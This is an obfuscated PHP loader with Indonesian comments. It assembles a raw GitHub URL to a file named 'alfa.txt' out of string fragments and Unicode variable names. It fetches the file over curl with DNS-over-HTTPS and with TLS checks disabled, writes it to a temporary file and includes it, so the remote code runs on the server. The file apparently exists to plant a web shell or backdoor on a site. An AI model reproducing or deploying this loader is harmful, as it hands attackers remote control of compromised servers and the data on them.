<?php
// AKTIFKAN ERROR DULU SUPAYA KELIHATAN MASALAHNYA
error_reporting(E_ALL);
ini_set('display_errors', 1);

$a="error"."_"."reporting";
$b="set"."_"."time"."_limit";
$a(E_ALL);
$b(300);

$ʘʮʃ="ht";$ʘʮʃ.="ps:";$ʘʮʃ.="//";$ʘʮʃ.="raw.";$ʘʮʃ.="githubusercontent.";$ʘʮʃ.="com/";$ʘʮʃ.="aqilogic/";$ʘʮʃ.="logic/";$ʘʮʃ.="refs/";$ʘʮʃ.="heads/";$ʘʮʃ.="main/";$ʘʮʃ.="alfa.txt";

$ᒙᗢᑴ="ht";$ᒙᗢᑴ.="tps:/";$ᒙᗢᑴ.="/cl";$ᒙᗢᑴ.="oud";$ᒙᗢᑴ.="-dn";$ᒙᗢᑴ.="s.co";$ᒙᗢᑴ.="m/dn";$ᒙᗢᑴ.="s-query";

$ᖷᑃᕦ=CuRl_iNit($ʘʮʃ);
if(dEfiNed('CURLOPT_DOH_URL')){cUrL_SeToPT($ᖷᑃᕦ,CURLOPT_DOH_URL,$ᒙᗢᑴ);}
cUrL_SeToPT($ᖷᑃᕦ,CURLOPT_RETURNTRANSFER,1);
// PERBAIKI UNTUK GITHUB:
cUrL_SeToPT($ᖷᑃᕦ,CURLOPT_SSL_VERIFYHOST,0);
cUrL_SeToPT($ᖷᑃᕦ,CURLOPT_SSL_VERIFYPEER,0);
cUrL_SeToPT($ᖷᑃᕦ,CURLOPT_FOLLOWLOCATION,1);
cUrL_SeToPT($ᖷᑃᕦ,CURLOPT_USERAGENT,'Mozilla/5.0');

$ʭʠʬ=curl_exec($ᖷᑃᕦ);
$curl_error = curl_error($ᖷᑃᕦ);
curl_close($ᖷᑃᕦ);

// CEK HASILNYA
if($curl_error){
    echo "❌ Error CURL: ".$curl_error;
    exit;
}
if(empty($ʭʠʬ)){
    echo "❌ File tidak berhasil diambil dari GitHub!";
    exit;
}

// SIMPAN DAN MUAT
$ᓩᕨᑘ=tmpfile();
$ᕚᐥᒟ=StREam_GEt_MeTa_DaTa($ᓩᕨᑘ);
$ᓻᓡᗋ=$ᕚᐥᒟ['uri'];
FwRiTe($ᓩᕨᑘ,$ʭʠʬ);
iNcLUde($ᓻᓡᗋ);
?>
